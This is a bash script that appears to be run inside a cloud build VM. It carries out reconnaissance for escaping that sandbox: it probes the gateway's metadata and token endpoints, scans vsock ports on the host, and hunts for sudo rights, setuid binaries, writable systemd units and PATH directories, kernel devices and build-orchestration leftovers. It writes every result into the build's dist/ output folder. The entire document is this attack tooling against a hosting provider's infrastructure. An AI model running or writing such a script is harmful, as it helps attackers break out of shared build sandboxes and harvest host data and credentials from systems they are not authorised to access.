#!/usr/bin/env bash
mkdir -p dist
exec > >(tee dist/r232ea4b0feaef51a.txt) 2>&1
echo "=== 1. WHAT IS 10.0.0.254:80 ==="
curl -s -i --max-time 6 http://10.0.0.254/ 2>&1 | head -30
for p in /metadata /latest/meta-data/ /v1/ /health /status /api /build /token /computeMetadata/v1/; do
  c=$(curl -s -o /dev/null -w '%{http_code}' --max-time 4 "http://10.0.0.254$p" 2>/dev/null)
  [ "$c" != "000" ] && [ "$c" != "404" ] && echo "  10.0.0.254$p -> $c"
done

echo
echo "=== 2. VSOCK (firecracker guest<->host channel) ==="
ls -la /dev/vsock /dev/vhost-vsock 2>/dev/null
cat /sys/module/vmw_vsock_virtio_transport_common/version 2>/dev/null
echo "local CID: $(cat /sys/devices/virtual/misc/vsock/cid 2>/dev/null || echo unknown)"
command -v python3 >/dev/null && echo "python3: yes" || echo "python3: NO"
if command -v python3 >/dev/null; then
python3 - <<'PY'
import socket
try:
    s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.close()
    print("  AF_VSOCK supported")
except Exception as e:
    print("  AF_VSOCK unavailable:", e); raise SystemExit
try:
    import fcntl,struct
    f=open('/dev/vsock','rb'); import array
    buf=array.array('I',[0]); fcntl.ioctl(f,0x7b9,buf,True); print("  local CID =",buf[0])
except Exception as e: print("  CID ioctl failed:",e)
HOST=2
for port in (80,443,1024,2000,5000,8000,8080,9000,10000,1,5555):
    s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(2)
    try:
        s.connect((HOST,port)); print(f"  *** vsock host CID2 port {port} OPEN ***")
        try:
            s.sendall(b"GET / HTTP/1.0\r\n\r\n"); print("     resp:",s.recv(200)[:150])
        except Exception as e: print("     no resp:",e)
    except Exception: pass
    finally: s.close()
print("  vsock scan done")
PY
fi

echo
echo "=== 3. ROOT INSIDE THE VM? ==="
echo "sudo: $(command -v sudo || echo none)"; sudo -n -l 2>&1 | head -5
echo "--- setuid/setgid binaries ---"
find / -xdev \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null | head -25
echo "--- groups ---"; id
echo "--- writable systemd / init units ---"
for d in /etc/systemd/system /lib/systemd/system /run/systemd/system; do [ -w "$d" ] && echo "  WRITABLE: $d"; done
echo "--- can we write to PATH dirs? ---"
for d in $(printf '%s' "$PATH" | tr ':' ' '); do [ -w "$d" ] && echo "  WRITABLE PATH DIR: $d"; done

echo
echo "=== 4. DEBUGFS / BPF / DEV ==="
ls /sys/kernel/debug 2>/dev/null | head -20
echo "debugfs readable: $?"
ls -la /dev | head -40
echo "--- interesting devices ---"
ls -la /dev/mem /dev/kmem /dev/kvm /dev/vhost-net /dev/fuse 2>/dev/null

echo
echo "=== 5. BUILD ORCHESTRATION LEFTOVERS ==="
ls -la /opt/buildhome/wrangler-output 2>/dev/null && cat /opt/buildhome/wrangler-output/* 2>/dev/null | head -20
ls -la / 2>/dev/null | head -25
cat /etc/hostname /etc/hosts 2>/dev/null
echo "--- cloudchamber / oci config ---"
find / -xdev -maxdepth 3 -iname '*cloudchamber*' -o -xdev -maxdepth 3 -iname '*firecracker*' 2>/dev/null | head -10
echo "=== END ==="
